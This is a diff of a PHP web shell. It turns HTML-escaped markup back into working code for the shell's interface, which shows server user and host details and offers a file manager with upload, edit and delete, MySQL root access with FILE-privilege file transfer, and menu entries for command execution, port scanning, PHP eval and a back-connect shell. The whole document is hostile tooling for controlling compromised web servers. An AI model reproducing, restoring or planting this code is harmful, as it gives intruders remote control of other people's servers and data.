@@ -31,7 +31,7 @@ $dis_func = get_cfg_var('disable_functions');
 define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
 @set_time_limit(0);
 
-foreach($_POST as $key =&gt; $value) {
+foreach($_POST as $key => $value) {
 	if (IS_GPC) {
 		$value = s_array($value);
 	}
@@ -136,7 +136,7 @@ if ($doing == 'backupmysql' && !$saveasfile) {
 		$filename = basename($dbname.'.sql');
 		header('Content-type: application/unknown');
 		header('Content-Disposition: attachment; filename='.$filename);
-		foreach($table as $k =&gt; $v) {
+		foreach($table as $k => $v) {
 			if ($v) {
 				sqldumptable($v);
 			}
@@ -180,11 +180,11 @@ if($doing=='mysqldown'){
 }
 
 ?>
-&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv="Content-Type" content="text/html; charset=gbk"&gt;
-&lt;title&gt;<?php echo $action.' - '.$_SERVER['HTTP_HOST'];?>&lt;/title&gt;
-&lt;style type="text/css"&gt;
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gbk">
+<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>
+<style type="text/css">
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
 .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
 .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
@@ -203,10 +203,10 @@ ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
 u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
 .drives{padding:5px;}
 .drives span {margin:auto 7px;}
-&lt;/style&gt;
-&lt;script type="text/javascript"&gt;
+</style>
+<script type="text/javascript">
 function CheckAll(form) {
-	for(var i=0;i&lt;form.elements.length;i++) {
+	for(var i=0;i<form.elements.length;i++) {
 		var e = form.elements[i];
 		if (e.name != 'chkall')
 		e.checked = form.chkall.checked;
@@ -319,11 +319,11 @@ function g(action,nowpath,p1,p2,p3,p4,p5) {
 	s(action,nowpath,p1,p2,p3,p4,p5);
 	$('opform').submit();
 }
-&lt;/script&gt;
-&lt;/head&gt;
-&lt;body style="margin:0;table-layout:fixed; word-break:break-all"&gt;
+</script>
+</head>
+<body style="margin:0;table-layout:fixed; word-break:break-all">
 <?php
-formhead(array('name'=&gt;'opform'));
+formhead(array('name'=>'opform'));
 makehide('action', $action);
 makehide('nowpath', $nowpath);
 makehide('p1', $p1);
@@ -348,27 +348,27 @@ if(!function_exists('posix_getegid')) {
 }
 
 ?>
-&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
-	&lt;tr class="head"&gt;
-		&lt;td&gt;&lt;span style="float:right;"&gt;<?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?>&lt;/span&gt;<?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)&lt;/td&gt;
-	&lt;/tr&gt;
-	&lt;tr class="alt1"&gt;
-		&lt;td&gt;
-			&lt;span style="float:right;"&gt;PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?>&lt;/span&gt;
-			&lt;a href="javascript:g('logout');"&gt;Logout&lt;/a&gt; | 
-			&lt;a href="javascript:g('file');"&gt;File Manager&lt;/a&gt; | 
-			&lt;a href="javascript:g('mysqladmin');"&gt;MYSQL Manager&lt;/a&gt; | 
-			&lt;a href="javascript:g('sqlfile');"&gt;MySQL Upload &amp; Download&lt;/a&gt; | 
-			&lt;a href="javascript:g('shell');"&gt;Execute Command&lt;/a&gt; | 
-			&lt;a href="javascript:g('phpenv');"&gt;PHP Variable&lt;/a&gt; | 
-			&lt;a href="javascript:g('portscan');"&gt;Port Scan&lt;/a&gt; | 
-			&lt;a href="javascript:g('secinfo');"&gt;Security information&lt;/a&gt; | 
-			&lt;a href="javascript:g('eval');"&gt;Eval PHP Code&lt;/a&gt;
-			<?php if (!IS_WIN) {?> | &lt;a href="javascript:g('backconnect');"&gt;Back Connect&lt;/a&gt;<?php }?>
-		&lt;/td&gt;
-	&lt;/tr&gt;
-&lt;/table&gt;
-&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr class="head">
+		<td><span style="float:right;"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
+	</tr>
+	<tr class="alt1">
+		<td>
+			<span style="float:right;">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>
+			<a href="javascript:g('logout');">Logout</a> | 
+			<a href="javascript:g('file');">File Manager</a> | 
+			<a href="javascript:g('mysqladmin');">MYSQL Manager</a> | 
+			<a href="javascript:g('sqlfile');">MySQL Upload &amp; Download</a> | 
+			<a href="javascript:g('shell');">Execute Command</a> | 
+			<a href="javascript:g('phpenv');">PHP Variable</a> | 
+			<a href="javascript:g('portscan');">Port Scan</a> | 
+			<a href="javascript:g('secinfo');">Security information</a> | 
+			<a href="javascript:g('eval');">Eval PHP Code</a>
+			<?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect');">Back Connect</a><?php }?>
+		</td>
+	</tr>
+</table>
+<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
 <?php
 $errmsg && m($errmsg);
 
@@ -485,31 +485,31 @@ if ($action == 'file') {
 	}
 
 	//²Ù×÷Íê±Ï
-	formhead(array('name'=&gt;'createdir'));
+	formhead(array('name'=>'createdir'));
 	makehide('newdirname');
 	makehide('dir',$nowpath);
 	formfoot();
-	formhead(array('name'=&gt;'fileperm'));
+	formhead(array('name'=>'fileperm'));
 	makehide('newperm');
 	makehide('pfile');
 	makehide('dir',$nowpath);
 	formfoot();
-	formhead(array('name'=&gt;'copyfile'));
+	formhead(array('name'=>'copyfile'));
 	makehide('sname');
 	makehide('tofile');
 	makehide('dir',$nowpath);
 	formfoot();
-	formhead(array('name'=&gt;'rename'));
+	formhead(array('name'=>'rename'));
 	makehide('oldname');
 	makehide('newfilename');
 	makehide('dir',$nowpath);
 	formfoot();
-	formhead(array('name'=&gt;'fileopform', 'target'=&gt;'_blank'));
+	formhead(array('name'=>'fileopform', 'target'=>'_blank'));
 	makehide('action');
 	makehide('opfile');
 	makehide('dir');
 	formfoot();
-	formhead(array('name'=&gt;'getsize'));
+	formhead(array('name'=>'getsize'));
 	makehide('getdir');
 	makehide('dir');
 	formfoot();
@@ -519,21 +519,21 @@ if ($action == 'file') {
 	$all = @disk_total_space($nowpath);
 	!$all && $all = 0;
 	$used = $all-$free;
-	p('&lt;h2&gt;File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)&lt;/h2&gt;');
+	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');
 
 	$cwd_links = '';
 	$path = explode('/', $nowpath);
 	$n=count($path);
-	for($i=0;$i&lt;$n-1;$i++) {
-		$cwd_links .= '&lt;a href="javascript:godir(\'';
-		for($j=0;$j&lt;=$i;$j++) {
+	for($i=0;$i<$n-1;$i++) {
+		$cwd_links .= '<a href="javascript:godir(\'';
+		for($j=0;$j<=$i;$j++) {
 			$cwd_links .= $path[$j].'/';
 		}
-		$cwd_links .= '\');"&gt;'.$path[$i].'/&lt;/a&gt;';
+		$cwd_links .= '\');">'.$path[$i].'/</a>';
 	}
 
 ?>
-&lt;script type="text/javascript"&gt;
+<script type="text/javascript">
 document.onclick = shownav;
 function shownav(e){
 	var src = e?e.target:event.srcElement;
@@ -553,57 +553,57 @@ function shownav(e){
 	$('inputnav').style.display = "none";
 	$('pathnav').style.display = "";
 }
-&lt;/script&gt;
-&lt;div style="background:#eee;margin-bottom:10px;"&gt;
-	&lt;table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0"&gt;
-		&lt;tr&gt;
-			&lt;td width="100%"&gt;<?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)&lt;/td&gt;
-			&lt;td nowrap&gt;&lt;input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"&gt;&lt;/td&gt;
-		&lt;/tr&gt;
-	&lt;/table&gt;
-	&lt;table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;"&gt;
-	&lt;form action="" method="post" id="godir" name="godir"&gt;
-		&lt;tr&gt;
-			&lt;td nowrap&gt;Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)&lt;/td&gt;
-			&lt;td width="100%"&gt;&lt;input name="view_writable" value="0" type="hidden" /&gt;&lt;input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;
-			&lt;td nowrap&gt;&lt;input class="bt" value="GO" type="submit"&gt;&lt;/td&gt;
-		&lt;/tr&gt;
-	&lt;/form&gt;
-	&lt;/table&gt;
+</script>
+<div style="background:#eee;margin-bottom:10px;">
+	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
+		<tr>
+			<td width="100%"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)</td>
+			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
+		</tr>
+	</table>
+	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
+	<form action="" method="post" id="godir" name="godir">
+		<tr>
+			<td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
+			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"></td>
+			<td nowrap><input class="bt" value="GO" type="submit"></td>
+		</tr>
+	</form>
+	</table>
 <?php
 	if (IS_WIN && IS_COM) {
 		$obj = new COM('scripting.filesystemobject');
-		if ($obj && is_object($obj) && $obj-&gt;Drives) {
-			echo '&lt;div class="drives"&gt;';
-			$DriveTypeDB = array(0 =&gt; 'Unknow',1 =&gt; 'Removable',2 =&gt; 'Fixed',3 =&gt; 'Network',4 =&gt; 'CDRom',5 =&gt; 'RAM Disk');
+		if ($obj && is_object($obj) && $obj->Drives) {
+			echo '<div class="drives">';
+			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
 			$comma = '';
-			foreach($obj-&gt;Drives as $drive) {
-				if ($drive-&gt;Path) {
-					p($comma.'&lt;a href="javascript:godir(\''.$drive-&gt;Path.'/\');"&gt;'.$DriveTypeDB[$drive-&gt;DriveType].'('.$drive-&gt;Path.')&lt;/a&gt;');
-					$comma = '&lt;span&gt;|&lt;/span&gt;';
+			foreach($obj->Drives as $drive) {
+				if ($drive->Path) {
+					p($comma.'<a href="javascript:godir(\''.$drive->Path.'/\');">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
+					$comma = '<span>|</span>';
 				}
 			}
-			echo '&lt;/div&gt;';
+			echo '</div>';
 		}
 	}
 ?>
-&lt;/div&gt;
+</div>
 <?php
 	$findstr = $_POST['findstr'];
 	$re = $_POST['re'];
 	tbhead();
-	p('&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;');
-	p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data"&gt;&lt;div style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'.$nowpath.'" type="hidden" /&gt;&lt;input name="dir" value="'.$nowpath.'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;');
-	p('&lt;a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');"&gt;WebRoot&lt;/a&gt;');
-	p(' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;');
-	p(' | &lt;a href="javascript:godir(\''.$nowpath.'\');"&gt;View All&lt;/a&gt;');
-	p(' | View Writable ( &lt;a href="javascript:godir(\''.$nowpath.'\',\'dir\');"&gt;Directory&lt;/a&gt;');
-	p(' | &lt;a href="javascript:godir(\''.$nowpath.'\',\'file\');"&gt;File&lt;/a&gt; )');
-	p(' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="javascript:createfile(\''.$nowpath.'\');"&gt;Create File&lt;/a&gt;');
+	p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
+	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$nowpath.'" type="hidden" /><input name="dir" value="'.$nowpath.'" type="hidden" /></div></form>');
+	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
+	p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>');
+	p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
+	p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
+	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
+	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
 
-	p('&lt;div style="padding:5px 0;"&gt;&lt;form action="'.$self.'" method="POST"&gt;Find string in files(current folder): &lt;input class="input" name="findstr" value="'.$findstr.'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'.$writabledb.'" type="text" /&gt;&lt;input name="dir" value="'.$dir.'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;');
+	p('<div style="padding:5px 0;"><form action="'.$self.'" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></div></td></tr>');
 
-	p('&lt;tr class="head"&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');
+	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
 
 	//²é¿´ËùÓÐ¿ÉÐ´ÎÄ¼þºÍÄ¿Â¼
 	$dirdata=array();
@@ -653,68 +653,68 @@ function shownav(e){
 	@sort($filedata);
 	$dir_i = '0';
 
-	p('&lt;form id="filelist" name="filelist" action="'.$self.'" method="post"&gt;');
+	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
 	makehide('action','file');
 	makehide('thefile');
 	makehide('doing');
 	makehide('dir',$nowpath);
 
-	foreach($dirdata as $key =&gt; $dirdb){
+	foreach($dirdata as $key => $dirdb){
 		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
 			if($getdir && $getdir == $dirdb['server_link']) {
 				$attachsize = dirsize($dirdb['server_link']);
 				$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
 			} else {
-				$attachsize = '&lt;a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');"&gt;Stat&lt;/a&gt;';
+				$attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Stat</a>';
 			}
 			$thisbg = bg();
-			p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
-			p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"&gt;&lt;/td&gt;');
-			p('&lt;td&gt;&lt;a href="javascript:godir(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['filename'].'&lt;/a&gt;&lt;/td&gt;');
-			p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');"&gt;'.$dirdb['mtime'].'&lt;/a&gt;&lt;/td&gt;');
-			p('&lt;td nowrap&gt;'.$attachsize.'&lt;/td&gt;');
-			p('&lt;td nowrap&gt;');
-			p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['dirchmod'].'&lt;/a&gt; / ');
-			p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['dirperm'].'&lt;/a&gt;'.$dirdb['fileowner'].'&lt;/td&gt;');
-			p('&lt;td nowrap&gt;&lt;a href="javascript:rename(\''.$dirdb['server_link'].'\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;');
-			p('&lt;/tr&gt;');
+			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"></td>');
+			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
+			p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');">'.$dirdb['mtime'].'</a></td>');
+			p('<td nowrap>'.$attachsize.'</td>');
+			p('<td nowrap>');
+			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
+			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
+			p('<td nowrap><a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
+			p('</tr>');
 			$dir_i++;
 		} else {
 			if($dirdb['filename']=='..') {
-				p('&lt;tr class='.bg().'&gt;');
-				p('&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="javascript:godir(\''.getUpPath($nowpath).'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;');
-				p('&lt;/tr&gt;');
+				p('<tr class='.bg().'>');
+				p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
+				p('</tr>');
 			}
 		}
 	}
 
-	p('&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;');
+	p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
 	$file_i = '0';
 
-	foreach($filedata as $key =&gt; $filedb){
+	foreach($filedata as $key => $filedb){
 		if($filedb['filename']!='..' && $filedb['filename']!='.') {
 			$fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
 			$thisbg = bg();
-			p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
-			p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"&gt;&lt;/td&gt;');
-			p('&lt;td&gt;'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '&lt;a href="'.$fileurl.'" target="_blank"&gt;'.$filedb['filename'].'&lt;/a&gt;' : $filedb['filename']).'&lt;/td&gt;');
-			p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');"&gt;'.$filedb['mtime'].'&lt;/a&gt;&lt;/td&gt;');
-			p('&lt;td nowrap&gt;'.$filedb['size'].'&lt;/td&gt;');
-			p('&lt;td nowrap&gt;');
-			p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.$filedb['filechmod'].'&lt;/a&gt; / ');
-			p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.$filedb['fileperm'].'&lt;/a&gt;'.$filedb['fileowner'].'&lt;/td&gt;');
-			p('&lt;td nowrap&gt;');
-			p('&lt;a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');"&gt;Down&lt;/a&gt; | ');
-			p('&lt;a href="javascript:copyfile(\''.$filedb['server_link'].'\');"&gt;Copy&lt;/a&gt; | ');
-			p('&lt;a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');"&gt;Edit&lt;/a&gt; | ');
-			p('&lt;a href="javascript:rename(\''.$filedb['server_link'].'\');"&gt;Rename&lt;/a&gt;');
-			p('&lt;/td&gt;&lt;/tr&gt;');
+			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"></td>');
+			p('<td>'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
+			p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">'.$filedb['mtime'].'</a></td>');
+			p('<td nowrap>'.$filedb['size'].'</td>');
+			p('<td nowrap>');
+			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
+			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
+			p('<td nowrap>');
+			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
+			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
+			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
+			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a>');
+			p('</td></tr>');
 			$file_i++;
 		}
 	}
-	p('&lt;tr class="head"&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');
-	p('&lt;tr class="'.bg().'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'.$dir_i.' directories / '.$file_i.' files&lt;/td&gt;&lt;/tr&gt;');
-	p('&lt;/form&gt;&lt;/table&gt;');
+	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
+	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
+	p('</form></table>');
 }// end dir
 
 elseif ($action == 'sqlfile') {
@@ -739,7 +739,7 @@ elseif ($action == 'sqlfile') {
 		}
 	}
 ?>
-&lt;script type="text/javascript"&gt;
+<script type="text/javascript">
 function mysqlfile(doing){
 	if(!doing) return;
 	$('doing').value=doing;
@@ -751,34 +751,34 @@ function mysqlfile(doing){
 	$('mysqlfile').charset.value=$('dbinfo').charset.value;
 	$('mysqlfile').submit();
 }
-&lt;/script&gt;
+</script>
 <?php
 	!$dbhost && $dbhost = 'localhost';
 	!$dbuser && $dbuser = 'root';
 	!$dbport && $dbport = '3306';
-	formhead(array('title'=&gt;'MYSQL Information','name'=&gt;'dbinfo'));
+	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
 	makehide('action','sqlfile');
-	p('&lt;p&gt;');
+	p('<p>');
 	p('DBHost:');
-	makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
+	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
 	p(':');
-	makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
+	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
 	p('DBUser:');
-	makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
+	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
 	p('DBPass:');
-	makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
+	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
 	p('DBName:');
-	makeinput(array('name'=&gt;'dbname','size'=&gt;15,'value'=&gt;$dbname));
+	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
 	p('DBCharset:');
-	makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'nokey'=&gt;1));
-	p('&lt;/p&gt;');
+	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
+	p('</p>');
 	formfoot();
-	p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile"&gt;');
-	p('&lt;h2&gt;Upload file&lt;/h2&gt;');
-	p('&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;');
-	p('&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" type="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;');
-	p('&lt;h2&gt;Download file&lt;/h2&gt;');
-	p('&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;');
+	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
+	p('<h2>Upload file</h2>');
+	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
+	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
+	p('<h2>Download file</h2>');
+	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
 	makehide('dbhost');
 	makehide('dbport');
 	makehide('dbuser');
@@ -787,31 +787,31 @@ function mysqlfile(doing){
 	makehide('charset');
 	makehide('doing');
 	makehide('action','sqlfile');
-	p('&lt;/form&gt;');
+	p('</form>');
 }
 
 elseif ($action == 'mysqladmin') {
 	!$dbhost && $dbhost = 'localhost';
 	!$dbuser && $dbuser = 'root';
 	!$dbport && $dbport = '3306';
-	$dbform = '&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;';
+	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
 	if(isset($dbhost)){
-		$dbform .= "&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" /&gt;\n";
+		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
 	}
 	if(isset($dbuser)) {
-		$dbform .= "&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" /&gt;\n";
+		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
 	}
 	if(isset($dbpass)) {
-		$dbform .= "&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" /&gt;\n";
+		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
 	}
 	if(isset($dbport)) {
-		$dbform .= "&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" /&gt;\n";
+		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
 	}
 	if(isset($dbname)) {
-		$dbform .= "&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" /&gt;\n";
+		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
 	}
 	if(isset($charset)) {
